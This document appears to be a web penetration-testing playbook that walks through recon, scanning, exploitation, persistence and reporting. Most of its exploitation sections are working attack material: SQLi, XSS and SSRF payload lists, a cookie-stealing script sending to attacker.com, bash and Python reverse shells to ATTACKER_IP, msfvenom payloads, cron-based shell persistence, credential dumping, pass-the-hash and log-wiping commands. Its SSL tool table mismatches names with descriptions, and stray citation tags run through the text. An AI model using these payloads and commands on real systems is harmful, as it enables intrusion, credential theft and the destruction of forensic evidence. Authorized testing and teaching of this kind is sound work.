# QUANTUMFORGE SECURITY OPERATIONS

## Web Penetration Testing Professional Playbook

### A Complete 6-Phase Ethical Hacking Reference for Red Team Operators, Cybersecurity Educators & Pentest Professionals

**Authored by:** Adeyinka Samuel (Big Sam) — Lead Red Team Operator | QuantumForge Security

**Classification:** STRICTLY CONFIDENTIAL | FOR AUTHORIZED USE ONLY

**Fast. Smart. Limitless.**

---

## CONFIDENTIALITY NOTICE

This document contains highly sensitive security information and proprietary penetration testing methodologies developed by QuantumForge Security Operations.

This playbook is classified **STRICTLY CONFIDENTIAL** and is intended solely for authorized cybersecurity professionals, red team operators, and security educators operating within the bounds of written authorization.

All techniques, tools, and methodologies described herein must be applied **ONLY** against systems for which explicit written authorization has been obtained. Unauthorized use against systems you do not own or have permission to test is a criminal offence under applicable cyber laws including Nigeria's Cybercrimes Act 2015, the Computer Fraud and Abuse Act (CFAA), and equivalent international legislation.

QuantumForge Security accepts no liability for misuse of the information contained in this document.

* **Document Title:** Web Penetration Testing Professional Playbook


* **Intended Audience:** Authorized Security Professionals Only


* **Classification:** STRICTLY CONFIDENTIAL


* **Author:** Adeyinka Samuel - QuantumForge Security


* **Version:** 1.0


* **Legal Framework:** OWASP, PTES, NIST SP 800-115



---

## TABLE OF CONTENTS

* **INTRODUCTION**
* About This Playbook


* How to Use This Guide


* Ethical & Legal Framework


* Pre-Engagement Checklist




* **PHASE 1 — RECONNAISSANCE**


* Domain & DNS Intelligence


* SSL/TLS Certificate Analysis


* Technology Fingerprinting


* OSINT & Email Intelligence


* Google Dorking


* Archive & Visual Recon


* Recon Workflow & Documentation




* **PHASE 2 — SCANNING & ENUMERATION**


* Port Scanning & Service Detection


* Web Application Scanning


* Directory & File Enumeration


* Subdomain Enumeration


* Parameter & Endpoint Discovery


* CMS-Specific Enumeration


* WAF Detection


* Scanning Workflow




* **PHASE 3 — VULNERABILITY ANALYSIS**


* Burp Suite & ZAP Configuration


* OWASP Top 10 Deep Dive


* SQL Injection Testing


* XSS Testing


* Command Injection


* XXE & SSRF


* Authentication Failures


* Vulnerability Workflow




* **PHASE 4 — EXPLOITATION**


* Pre-Exploitation Checklist


* Metasploit Framework


* SQL Injection Exploitation


* File Upload Exploitation


* XSS & BEEF Framework


* Reverse Shell Operations


* Meterpreter Operations


* Evidence Collection




* **PHASE 5 — MAINTAINING ACCESS**


* Linux Persistence Techniques


* Windows Persistence


* Privilege Escalation Linux


* Privilege Escalation - Windows


* Credential Harvesting


* Lateral Movement & Pivoting


* Covering Tracks


* Cleanup Checklist




* **PHASE 6 — REPORTING & DOCUMENTATION**


* Report Structure Overview


* Executive Summary


* Technical Findings Template


* Attack Chain Narrative


* Risk Matrix & CVSS Scoring


* Remediation Roadmap


* Report Delivery Protocol




* **APPENDICES**


* Quick Reference Command Sheet


* CVSS Scoring Guide


* Tool Installation Reference


* Legal Authorization Templates





---

## INTRODUCTION

### About This Playbook

This playbook is a comprehensive, professional-grade reference for authorized web application penetration testing. It was developed by QuantumForge Security Operations as both a teaching instrument and a real-world operational guide for ethical red team engagements.

The document follows the complete 6-phase penetration testing lifecycle from initial reconnaissance through to professional report delivery — providing tools, syntax, workflows, payloads, and documentation templates at each stage.

Every technique documented here is mapped to industry-standard frameworks including OWASP Testing Guide v4.2, the Penetration Testing Execution Standard (PTES), and NIST SP 800-115. All content is presented within the context of authorized, ethical security testing.

### Ethical & Legal Framework

Before executing any technique in this playbook, the following must be in place:

* **Written Authorization** — signed Rules of Engagement (RoE) document


* **Defined Scope** — explicit list of in-scope targets, IPs, and domains


* **Testing Window** — agreed timeframe for active testing


* **Emergency Contact** — client-side contact for critical findings


* **Rollback Plan** — documented procedure for reversing any changes made


* **Evidence Logging** — screen recording and terminal logging active throughout



Executing these techniques against systems without explicit written authorization is illegal under the Nigeria Cybercrimes Act 2015, CFAA, Computer Misuse Act (UK), and equivalent laws globally. Always obtain authorization first.

### Pre-Engagement Checklist

* [x] Obtain signed authorization document with scope, dates, and signatures


* [x] Confirm all in-scope IP addresses and domains in writing


* [x] Set up isolated testing environment (VPN, dedicated VM)


* [x] Configure Burp Suite proxy and CA certificate in browser


* [x] Start terminal session logging: `script -a engagement.log`


* [x] Start screen recording software for video evidence


* [x] Create organized evidence folder structure


* [x] Brief all team members on scope and rules of engagement


* [x] Confirm emergency stop procedure with client point of contact



> **TEACHING NOTE:** Always work from a dedicated penetration testing VM — never from your personal or work machine. Keep all engagement data encrypted and stored securely.
> 
> 

---

## PHASE 1 — RECONNAISSANCE

### Passive & Active Intelligence Gathering — Know Your Target Before You Touch It

Reconnaissance is the foundation of every successful penetration test. The more intelligence gathered before active testing begins, the more targeted, effective, and professional the engagement will be. Recon is divided into passive (no direct target interaction) and active (minimal direct interaction) phases.

### Domain & DNS Intelligence

| Tool | What It Does | Syntax/Usage |
| --- | --- | --- |
| **WHOIS** | Domain owner, registrar, nameservers | `whois targetsite.com`

 |
| **NSLookup** | Query DNS records: A, MX, NS, CNAME | `nslookup -type=MX targetsite.com`

 |
| **Dig** | Advanced DNS query, more detail than nslookup | `dig targetsite.com ANY`

 |
| **Subfinder** | Passive subdomain enumeration from public sources | `subfinder -d targetsite.com -o subs.txt`

 |
| **Sublist3r** | Subdomain brute-force OSINT enumeration | `python sublist3r.py -d target.com`

 |
| **Amass** | Deep subdomain discovery via OSINT and certs | `amass enum -passive -d target.com`

 |
| **DNSdumpster** | Visual DNS map: subdomains, MX, TXT | `[https://dnsdumpster.com](https://dnsdumpster.com)`

 |

### SSL/TLS Certificate Analysis

| Tool | What It Does | Syntax/Usage |
| --- | --- | --- |
| **SSLScan** | Scans ciphers, protocol versions, vulnerabilities | `sslscan targetsite.com`

 |
| **testssl.sh** | Comprehensive TLS tests, Heartbleed, POODLE, etc. | `testssl.sh targetsite.com`

 |
| **SSLDump** | Fast SSL/TLS config analyzer, HSTS check | `sslyze targetsite.com`

 |
| **SSLyze** | Certificate transparency logs reveal hidden subdomains | `[https://crt.sh/?q=%.target.com](https://crt.sh/?q=%.target.com)`

 |
| **crt.sh** | Captures and decodes SSL/TLS traffic (requires network) | `ssldump -i eth0 host target.com`

 |
| **SSLSplit** | Transparent SSL interception proxy simulation | `sslsplit -D -s logdir 0.0.0.0 8443`

 |

> **TEACHING NOTE:** `crt.sh` alone can reveal hidden subdomains the target doesn't know are publicly exposed through certificate transparency logs. Always check it early in recon.
> 
> 

### Technology & Infrastructure Fingerprinting

| Tool | What It Does | Syntax/Usage |
| --- | --- | --- |
| **BuiltWith** | CMS, frameworks, analytics, CDN, hosting | `[https://builtwith.com/target.com](https://builtwith.com/target.com)`

 |
| **WhatWeb** | CLI tech stack detection, detailed reporting | `whatweb -v targetsite.com`

 |
| **Wappalyzer** | Browser extension real-time tech detection | Extension in Firefox/Chrome

 |
| **Netcraft** | Web server history, hosting, tech timeline | `[https://sitereport.netcraft.com](https://sitereport.netcraft.com)`

 |
| **Shodan** | Internet-connected devices, exposed headers | `shodan search domain:target.com`

 |
| **Censys** | Certificate + host data search engine | `[https://search.censys.io](https://search.censys.io)`

 |

### OSINT & Email Intelligence

| Tool | What It Does | Syntax/Usage |
| --- | --- | --- |
| **theHarvester** | Emails, subdomains, IPs from public sources | `theHarvester -d target.com -b google`

 |
| **SpiderFoot** | Automated OSINT maps entire digital footprint | `python3 sf.py -s target.com -t WEB`

 |
| **Maltego** | Visual link analysis: people, domains, infrastructure | Create graph, use transforms

 |
| **OSINT Framework** | Curated map of OSINT tools by category | `[https://osintframework.com](https://osintframework.com)`

 |
| **Intelligence X** | Deep OSINT: dark web, leaks, Tor, pastebins | `[https://intelx.io](https://intelx.io)`

 |
| **Hunter.io** | Find and verify company email patterns | `[https://hunter.io](https://hunter.io)`

 |

### Google Dorking — Passive Recon Goldmine

Google Dorks extract sensitive information indexed by search engines without touching the target directly. A single effective dork can reveal admin panels, backup files, exposed credentials, and database dumps.

| Dork / Operator | What It Does | Syntax/Usage Example |
| --- | --- | --- |
| `site:` | All indexed pages of target

 | `site:targetsite.com`

 |
| `intitle:` | Pages with specific title words

 | `intitle:"admin panel" site:target.com`

 |
| `inurl:` | Pages with specific URL words

 | `inurl:login site:targetsite.com`

 |
| `filetype:` | Exposed file types

 | `filetype:sql site:targetsite.com`

 |
| `"index of"` | Open directory listings

 | `"index of /" site:targetsite.com`

 |
| `ext:` | Exposed `.env` config files

 | `ext:env site:targetsite.com`

 |
| `intext:` | Specific text within page content

 | `intext:"password" site:target.com`

 |
| `cache:` | Google cached version of page

 | `cache:targetsite.com`

 |

### Archive, Visual Recon & Network Intelligence

| Tool | What It Does | Syntax/Usage |
| --- | --- | --- |
| **Wayback Machine** | Historical website snapshots | `[https://web.archive.org](https://web.archive.org)`

 |
| **EyeWitness** | Screenshots of web services at scale | `python EyeWitness.py --web -f urls.txt`

 |
| **Aquatone** | Subdomain takeover + visual mapping | `cat subs.txt |
| **Gowitness** | Fast web screenshot reporting | `gowitness file -f urls.txt`

 |
| **BGP Toolkit** | ASN, IP ranges, ISP of target | `[https://bgp.he.net](https://bgp.he.net)`

 |
| **IPinfo.io** | IP geolocation, ASN, hosting provider | `[https://ipinfo.io/](https://ipinfo.io/)[IP]`

 |
| **GAU** | Fetches known URLs from multiple sources | `gau targetsite.com |

### Phase 1 Workflow

```text
START RECONNAISSANCE
 1. WHOIS                 → Who owns the domain?
 2. DNS (Dig / NSLookup)  → What records exist?
 3. crt.sh + Amass        → What subdomains exist?
 4. BuiltWith + WhatWeb   → What tech stack is running?
 5. Shodan / Censys       → What is exposed on the internet?
 6. theHarvester + SF     → Emails and people linked?
 7. Google Dorks          → What is accidentally indexed?
 8. SSLScan / testssl.sh  → How secure is SSL config?
 9. Wayback Machine       → Historical site snapshot?
10. Eyewitness            → Capture visual state of all assets
OUTPUT: Target Profile Document
```[cite: 8]

---

## PHASE 2 — SCANNING & ENUMERATION
### Active Attack Surface Mapping — What Is Running, Open, and Misconfigured?
Scanning moves from passive intelligence to active interaction[cite: 9]. The goal is to build a precise attack surface map: every open port, every running service, every exposed directory, every parameter[cite: 9]. Always confirm WAF presence before aggressive scanning[cite: 9].

### Port Scanning & Service Detection

| Tool | What It Does | Syntax/Usage |
| :--- | :--- | :--- |
| **Nmap** | King of port scanners: OS, version, scripts | `nmap -sS -sV -A -p- targetsite.com`[cite: 9] |
| **RustScan** | Ultra-fast open port discovery, pipes to Nmap | `rustscan -a target.com -u 5000 -- -sC -sV`[cite: 9] |
| **Masscan** | Fastest raw port scanner for large ranges | `masscan -p1-65535 target.com --rate 1000`[cite: 9] |
| **Nmap NSE** | Built-in scripts: vuln detect, banner grab | `nmap --script vuln targetsite.com`[cite: 9] |
| **Nmap UDP** | Scans UDP ports often missed | `nmap -sU --top-ports 200 target.com`[cite: 9] |
| **Zmap** | Internet-wide single-port scanner | `zmap -p 443 targetsite.com`[cite: 9] |

> **TEACHING NOTE:** Use RustScan first to find all open ports rapidly, then pipe directly into Nmap for deep service fingerprinting. This saves 80 percent of scanning time[cite: 9].

#### Nmap Gold Standard Pipeline
```bash
rustscan -a targetsite.com --ulimit 5000 -- -sC -sV -oN scan_results.txt
```[cite: 9]

### Web Application Scanning

| Tool | What It Does | Syntax/Usage |
| :--- | :--- | :--- |
| **Nikto** | Web server scanner: misconfigs, dangerous files | `nikto -h [https://target.com](https://target.com) -ssl`[cite: 9] |
| **OWASP ZAP** | Full web app scanner, spider, active scan | GUI / Headless setup |
| **Burp Suite** | Industry standard proxy, intercept, scan | Proxy: `127.0.0.1:8080` → Browse target[cite: 9] |
| **Nuclei** | Template-based vuln scanner, thousands of CVEs | `nuclei -u [https://target.com](https://target.com) -t cves/`[cite: 9] |
| **Wfuzz** | Web fuzzer for hidden params, endpoints | `wfuzz -z file,wordlist.txt [https://target.com/FUZZ](https://target.com/FUZZ)`[cite: 9] |
| **Skipfish** | Google's recon/scan tool, builds site map | `skipfish -o output_dir [https://target.com](https://target.com)`[cite: 9] |
| **Arachni** | Feature-rich web scanner with REST API | `arachni [http://targetsite.com](http://targetsite.com)`[cite: 9] |

### Directory & File Enumeration

| Tool | What It Does | Syntax/Usage |
| :--- | :--- | :--- |
| **Gobuster** | Brute-forces directories, files, DNS | `gobuster dir -u [https://target.com](https://target.com) -w wordlist.txt`[cite: 9, 10] |
| **Ffuf** | Fast web fuzzer: dirs, params, headers, hosts | `ffuf -w words.txt -u [https://target.com/FUZZ](https://target.com/FUZZ)`[cite: 10] |
| **Feroxbuster** | Recursive directory brute-force | `feroxbuster -u [https://target.com](https://target.com) -r`[cite: 10] |
| **Dirsearch** | Python fast directory scanner with streaming | `python3 dirsearch.py -u [https://target.com](https://target.com)`[cite: 10] |
| **Dirb** | Classic directory scanner built-in wordlists | `dirb [https://target.com](https://target.com)`[cite: 10] |

> **TEACHING NOTE:** Always use multiple wordlists. SecLists from `/usr/share/seclists/Discovery/Web-Content/` is the gold standard collection — use `common.txt` first, then `raft-large-directories.txt`[cite: 10].

### Parameter & Endpoint Discovery

| Tool | What It Does | Syntax/Usage |
| :--- | :--- | :--- |
| **Arjun** | HTTP parameter discovery (hidden GET/POST) | `python3 arjun.py -u [https://target.com/page.php](https://target.com/page.php)`[cite: 10] |
| **ParamSpider** | Mines parameters from web archives | `python3 paramspider.py --domain target.com`[cite: 10] |
| **LinkFinder** | Extracts endpoints from JavaScript files | `python3 linkfinder.py -i [https://target.com](https://target.com) -d`[cite: 10] |
| **Katana** | Next-gen web crawling framework | `katana -u [https://target.com](https://target.com) -d 5`[cite: 10] |
| **Hakrawler** | Crawls URLs, extracts endpoints, paths | `hakrawler -url [https://target.com](https://target.com) -depth 3`[cite: 10] |
| **Waybackurls** | Historical URLs from Wayback Machine | `waybackurls target.com | tee urls.txt`[cite: 10] |

> **TEACHING NOTE:** JavaScript files are goldmines. APIs, tokens, hidden endpoints, and hardcoded credentials hide inside minified JS. Always enumerate every `.js` file discovered[cite: 10].

### WAF Detection & CMS Enumeration

| Tool | What It Does | Syntax/Usage |
| :--- | :--- | :--- |
| **Wafw00f** | Detects Web Application Firewalls | `wafw00f [https://targetsite.com](https://targetsite.com)`[cite: 10] |
| **WPScan** | WordPress: users, plugins, themes, vulns | `wpscan --url [https://target.com](https://target.com) --enumerate u,p,t`[cite: 10] |
| **CMSeeK** | Auto-detect CMS and run appropriate exploits | `python3 cmseek.py -u [https://target.com](https://target.com)`[cite: 10] |
| **JoomScan** | Joomla vulnerability scanner | `joomscan -u [https://targetsite.com](https://targetsite.com)`[cite: 10] |
| **HTTPX** | Fast HTTP probe: status, titles, tech | `httpx -l subs.txt -title -tech-detect`[cite: 10] |

Always detect WAF before aggressive scanning. If a WAF is present, adjust rate limiting and payload encoding to avoid being blocked and alerting defenders[cite: 10].

---

## PHASE 3 — VULNERABILITY ANALYSIS
### OWASP Top 10 Deep Testing — Burp Suite + ZAP + Full Payload Arsenal
With the attack surface mapped, Phase 3 systematically probes every discovered endpoint, parameter, and service against the OWASP Top 10 2021[cite: 11]. Every finding is confirmed manually before being documented[cite: 11]. Use both automated tooling and manual testing — automated scanners miss business logic flaws that only human analysis reveals[cite: 11].

### Burp Suite Configuration
1. `Proxy > Options > Add listener`: `127.0.0.1:8080`[cite: 11]
2. `Browser > Network Settings > Manual Proxy`: `127.0.0.1:8080`[cite: 11]
3. Install Burp CA certificate in browser[cite: 11]
4. `Target > Scope > Add target domain`[cite: 11]
5. Turn Intercept **ON** and begin browsing target[cite: 11]

#### Essential BApp Store Extensions:
* Active Scan++ | Autorize | Param Miner[cite: 11]
* Turbo Intruder | JWT Editor | Logger++[cite: 11]
* Retire.js | Hackvertor | CSRF Scanner | DOM Invader[cite: 11]

### OWASP Top 10 — Quick Reference

| OWASP ID | Category | Severity | Primary Tools |
| :--- | :--- | :--- | :--- |
| **A01:2021** | Broken Access Control[cite: 11] | CRITICAL[cite: 11] | Autorize, Burp Repeater[cite: 11] |
| **A02:2021** | Cryptographic Failures[cite: 11] | HIGH[cite: 11] | testssl.sh, JWT Editor[cite: 11] |
| **A03:2021** | Injection (SQLi, XSS, CMDI)[cite: 11] | CRITICAL[cite: 11] | SQLMap, XSStrike, Commix[cite: 11] |
| **A04:2021** | Insecure Design[cite: 11] | HIGH[cite: 11] | Manual, Turbo Intruder[cite: 11] |
| **A05:2021** | Security Misconfiguration[cite: 11] | HIGH[cite: 11] | Nikto, Nuclei, ffuf[cite: 11] |
| **A06:2021** | Vulnerable Components[cite: 11] | MEDIUM[cite: 11] | Retire.js, Nuclei CVEs[cite: 11] |
| **A07:2021** | Auth & Session Failures[cite: 11] | HIGH[cite: 11] | Hydra, Burp Intruder[cite: 11] |
| **A08:2021** | Software Integrity Failures[cite: 11] | HIGH[cite: 11] | Manual, Dependency Check[cite: 11] |
| **A09:2021** | Logging & Monitoring Failures[cite: 12] | MEDIUM[cite: 12] | Manual analysis[cite: 12] |
| **A10:2021** | SSRF[cite: 12] | HIGH[cite: 12] | Burp Collaborator, manual[cite: 12] |

### SQL Injection Full Payload Arsenal

```sql
# Basic Detection
' OR '1'='1
" OR "1"="1
) OR ('x'='x
admin' --
admin' #

# Error-Based Extraction (MySQL)
AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--

# Union-Based
ORDER BY 1-- (find column count first)
ORDER BY 2--
ORDER BY 3--
UNION SELECT table_name,2,3 FROM information_schema.tables--

# Time-Based Blind
AND SLEEP(5)-- (MySQL)
WAITFOR DELAY '0:0:5' (MSSQL)
SELECT pg_sleep(5)-- (PostgreSQL)
```[cite: 11, 12]

#### SQLMap Automated Exploitation
```bash
sqlmap -u 'https://target.com/page?id=1' --dbs
sqlmap -r burp_request.txt --dbs --batch
sqlmap -u 'https://target.com/page?id=1' --tamper=space2comment,randomcase --dbs
sqlmap -u 'https://target.com/page?id=1' -D dbname -T users --dump
```[cite: 12]

### XSS Payload Arsenal

```html
# Basic Detection
<script>alert(1)</script>
"><script>alert(1)</script>

# Filter Bypass Payloads
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>

# Cookie Theft (Real PoC)
<script>new Image().src='https://attacker.com/c='+document.cookie</script>
```[cite: 12]

#### XSStrike Intelligent XSS Scanner
```bash
python3 xsstrike.py -u 'https://target.com/search?q=test'
python3 xsstrike.py -u 'https://target.com' --crawl
```[cite: 12]

### SSRF Payload Arsenal

```text
# Basic Detection
?url=http://127.0.0.1
?url=http://localhost

# Cloud Metadata Endpoints (Critical Impact)
?url=http://169.254.169.254/latest/meta-data/ (AWS)
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://metadata.google.internal/computeMetadata/v1/ (GCP)

# IP Encoding Bypasses
?url=http://127.1
?url=http://2130706433 (decimal)
?url=http://0x7f000001
?url=http://0177.0.0.1 (octal)

# Protocol Manipulation
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/
```[cite: 12]

---

## PHASE 4 — EXPLOITATION
### Controlled Proof-of-Concept — Prove the Risk, Don't Cause the Damage
Phase 4 converts confirmed vulnerabilities into controlled, documented proof-of-concept compromises[cite: 13]. The operator mindset here is critical: exploit to prove access exists, capture evidence immediately, then stop[cite: 13]. Professional red teamers do not destroy data, disrupt services, or escalate beyond what is needed to demonstrate impact[cite: 13].

> Every exploitation attempt must be executed within written, authorized scope[cite: 13]. Confirm screen recording and terminal logging are active before beginning this phase[cite: 13].

### Pre-Engagement Checklist
* [x] Written authorization confirmed and on file[cite: 13]
* [x] Scope document reviewed, target IP/domain confirmed[cite: 13]
* [x] Testing window is currently active[cite: 13]
* [x] Screen recording software running[cite: 13]
* [x] Terminal logging active: `script -a exploitation_session.log`[cite: 13]
* [x] Burp Suite logging enabled for all requests[cite: 13]
* [x] Rollback procedures documented[cite: 13]
* [x] Client emergency contact number ready[cite: 13]

### Metasploit Framework
```bash
# Start Metasploit with database
msfdb init && msfconsole -q

# Set global options
setg RHOSTS targetsite.com
setg LHOST YOUR_ATTACKER_IP
setg LPORT 4444

# Workspace management (keep engagements separate)
workspace -a QuantumForge_Engagement_001

# Set up multi/handler listener
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
exploit -j  # run as background job

# Session management
sessions -l  # list active sessions
sessions -i 1  # interact with session 1
```[cite: 13]

### Payload Generation — MSFVenom
```bash
# PHP reverse shell (web app exploitation)
msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shell.php

# Linux ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf > shell.elf

# Windows executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe
```[cite: 13, 14]

### Reverse Shell Manual One-Liners

```bash
# Netcat listener (attacker machine)
nc -lvnp 4444
pwncat-cs -lp 4444  # advanced listener with auto-upgrade

# Bash reverse shell (trigger on target)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python3 reverse shell
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# Shell upgrade (stabilise TTY after catching raw shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo → fg → export TERM=xterm
```[cite: 14]

### Evidence Collection Protocol
* Timestamp every successful exploit: `date && whoami && hostname && id`[cite: 14]
* Screenshot terminal showing successful access[cite: 14]
* Export Burp request/response: Right-click → Save item[cite: 14]
* Capture minimum viable proof only — do not abuse access[cite: 14]
* CVSS score every finding using `[https://www.first.org/cvss/calculator/3.1](https://www.first.org/cvss/calculator/3.1)`[cite: 14]
* Document exact payload used, endpoint, and HTTP method[cite: 14]
* Stop immediately after proof is captured — do not escalate further[cite: 14]

---

## PHASE 5 — MAINTAINING ACCESS
### Persistence, Privilege Escalation, Lateral Movement, Covering Tracks
Phase 5 demonstrates to the client what a motivated attacker would do after gaining initial access: how they would persist, escalate, and move laterally[cite: 15]. Every technique is documented with its corresponding cleanup procedure[cite: 15]. Nothing is left behind after the engagement[cite: 15].

> Every persistence mechanism planted must be immediately logged with its exact location and removal command. Verify cleanup completion before closing the engagement[cite: 15].

### Linux Persistence Techniques

```bash
# 1. Cron Job Persistence
crontab -e
# Add: */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
# CLEANUP: crontab -r

# 2. SSH Key Persistence
# On attacker machine:
ssh-keygen -t rsa -b 4096 -f /target_key -N ""
# Plant public key on target:
echo 'PUBLIC_KEY' >> ~/.ssh/authorized_keys
# CLEANUP: Remove key line from authorized_keys

# 3. Systemd Service Persistence (root required!)
# Create /etc/systemd/system/svc-update.service
# CLEANUP: systemctl stop/disable + rm service file
```[cite: 15]

### Linux Privilege Escalation

```bash
# Automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
lse.sh -i  # Linux Smart Enumeration
./pspy64   # Watch processes without root permissions

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Common GTFOBins exploits:
sudo vim -c '!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo find / -exec /bin/sh -p \; -quit
```[cite: 15]

### Windows Privilege Escalation

```cmd
:: Automated enumeration
winPEASany.exe
Import-Module .\PowerUp.ps1; Invoke-AllChecks

:: Token Impersonation (Meterpreter)
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter > getsystem  :: automated escalation attempt

:: Registry Run Key Persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\payload.exe" /f
:: CLEANUP: reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /f
```[cite: 15, 16]

### Credential Harvesting

```bash
# Mimikatz (Windows memory credentials)
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > lsa_dump_sam

# Linux credential locations
cat /etc/shadow
cat ~/.bash_history
find / -name 'wp-config.php' 2>/dev/null
find / -name '.env' 2>/dev/null
find / -name 'id_rsa' 2>/dev/null

# Hash cracking
hashcat -m 0 hashes.txt rockyou.txt        # MD5
hashcat -m 3200 hashes.txt rockyou.txt     # bcrypt
hashcat -m 0 hashes.txt rockyou.txt -r best64.rule
```[cite: 16]

### Lateral Movement & Pivoting

```bash
# Proxychains pivoting
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
ssh -D 1080 -N user@COMPROMISED_HOST
proxychains nmap -sT -Pn 192.168.1.100

# Chisel tunneling
# Attacker: chisel server -p 8000 --reverse
# Target: ./chisel client ATTACKER_IP:8000 R:1080:socks

# Pass the Hash
python3 psexec.py administrator@192.168.1.100 -hashes NTLM_HASH
crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH
```[cite: 16]

### Cleanup & Track Covering

```bash
# Linux clear evidence
history -c && history -w
echo "" > ~/.bash_history
sed -i '/ATTACKER_IP/d' /var/log/auth.log
rm -f /var/www/html/shell.php /tmp/linpeas.sh

# Windows clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
meterpreter > clearev

# Remove scheduled tasks
schtasks /delete /tn 'TaskName' /f
```[cite: 16]

#### Mandatory Cleanup Checklist
* [x] Cron jobs removed and verified absent[cite: 17]
* [x] SSH keys removed from authorized_keys[cite: 17]
* [x] Webshells deleted from web root[cite: 17]
* [x] Systemd services stopped, disabled, and removed[cite: 17]
* [x] Windows registry run keys deleted[cite: 17]
* [x] Scheduled tasks removed[cite: 17]
* [x] All uploaded tools and payloads deleted[cite: 17]
* [x] Event logs cleared (document what was cleared in report)[cite: 17]
* [x] Terminal histories cleared[cite: 17]
* [x] All tunnels and listeners closed on attacker machine[cite: 17]
* [x] Client notified that cleanup is complete with timestamp[cite: 17]

---

## PHASE 6 — REPORTING & DOCUMENTATION
### The Most Powerful Deliverable — Turning Technical Findings Into Business Impact
A penetration test without a professional report is just unauthorized hacking with screenshots[cite: 18]. The report **IS** the deliverable[cite: 18]. Everything else was gathering evidence for this moment[cite: 18]. A great report speaks two languages simultaneously — business risk for the executive team, and technical detail for the developers[cite: 18].

### Report Structure Overview
* **Cover Page** — client name, classification, engagement reference[cite: 18]
* **Confidentiality Notice** — distribution restrictions[cite: 18]
* **Table of Contents**[cite: 18]
* **Engagement Overview** — scope, authorization, constraints[cite: 18]
* **Executive Summary** — overall risk, key findings in plain language[cite: 18]
* **Technical Findings** — one template per finding, CVSS scored[cite: 18]
* **Attack Chain Narrative** — how findings chain for maximum impact[cite: 18]
* **Risk Matrix** — all findings in severity-ordered table[cite: 18]
* **Remediation Roadmap** — phased timeline with priorities[cite: 18]
* **Methodology** — frameworks and tools used[cite: 18]
* **Appendices** — raw scan outputs, screenshots, payload reference[cite: 18]

### CVSS Severity Reference

| Severity | CVSS Score | Remediation Time | Meaning |
| :--- | :--- | :--- | :--- |
| **CRITICAL** | 9.0–10.0[cite: 18] | Immediate — 24 to 48 hours[cite: 18] | Full system compromise possible[cite: 18] |
| **HIGH** | 7.0–8.9[cite: 18] | Within 2 weeks[cite: 18] | Significant data or system risk[cite: 18] |
| **MEDIUM** | 4.0–6.9[cite: 19] | Within 30 days[cite: 19] | Limited exploitability or impact[cite: 19] |
| **LOW** | 0.1–3.9[cite: 19] | Within 90 days[cite: 19] | Minimal real-world impact[cite: 19] |
| **INFO** | 0.0[cite: 19] | Best effort[cite: 19] | Informational only — no direct risk[cite: 19] |

### Technical Finding Template
* **FINDING ID:** `QF-2025-001`[cite: 18]
* **Title:** SQL Injection in Search Parameter[cite: 18]
* **Severity:** CRITICAL[cite: 18]
* **CVSS Score:** 9.8[cite: 18]
* **CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`[cite: 18]
* **OWASP:** `A03:2021`[cite: 18]
* **CWE:** `CWE-89`[cite: 18]
* **Status:** Open[cite: 18]
* **AFFECTED COMPONENT:**
  * **URL:** `[https://targetsite.com/search](https://targetsite.com/search)`[cite: 18]
  * **Parameter:** `q`[cite: 19]
  * **Method:** `GET`[cite: 19]
  * **Auth:** Not Required[cite: 19]
* **DESCRIPTION:**  
  The search functionality fails to sanitize user input before incorporating it into SQL queries. An attacker can extract all data[cite: 19].
* **PROOF OF CONCEPT:**  
  * **Payload:** `1' UNION SELECT username, password FROM users--`[cite: 19]
  * **Result:** User credentials returned in response[cite: 19].
  * **Evidence:** screenshot `QF001-poc.png` | Timestamp: `2025-01-15 14:32`[cite: 19]
* **BUSINESS IMPACT:**  
  * **CONFIDENTIALITY:** Complete database exposure[cite: 19]
  * **INTEGRITY:** Database modification possible[cite: 19]
  * **DATA AT RISK:** All customer records[cite: 19]
* **REMEDIATION:**  
  1. Implement parameterized queries / prepared statements[cite: 19]
  2. Deploy WAF rule to block SQLi patterns immediately[cite: 19]
  3. Disable verbose SQL error messages[cite: 19]
  4. Conduct full code review of all DB interaction points[cite: 19]

### Attack Chain Narrative
The attack chain narrative tells the story of how individual findings combine into a realistic compromise scenario[cite: 19]. This section is often the most impactful part of the report for executive audiences — it transforms a list of technical findings into a comprehensible sequence of events that demonstrates true business risk[cite: 19].

* **SCENARIO:** From Search Bar to Server Root[cite: 19]
  * **STEP 1 — INITIAL RECON (2 hours):** OSINT reveals tech stack, 3 exposed subdomains, staff email patterns, and outdated jQuery[cite: 19].
  * **STEP 2 — INITIAL FOOTHOLD (30 minutes):** SQLi in search parameter extracts admin credentials. MD5 hash cracked in under 2 minutes[cite: 19].
